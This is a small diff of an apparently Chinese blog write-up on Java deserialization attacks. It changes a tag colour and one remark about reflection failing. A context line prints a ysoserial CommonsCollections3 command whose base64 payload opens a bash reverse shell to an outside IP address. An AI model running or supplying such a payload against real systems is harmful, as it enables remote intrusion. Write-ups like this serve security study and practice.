@@ -244,7 +244,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Java/" style="color: #ffa2c4">Java</a>
+                <a href="/blog/tags/Java/" style="color: #00a596">Java</a>
             </span>
             
         </span>
@@ -534,7 +534,7 @@ data<span class="token operator">=</span><span class="token keyword">new</span> 
     <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>发现打不进去，估计是要反射</p>
+<p>发现打不进去，反射也不行</p>
 <p>还是用ysoserial吧（</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial.jar CommonsCollections3  <span class="token string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTUuMjM2LjE1My4xNzIvNDE2NzggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span><span class="token operator">|</span>base64<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
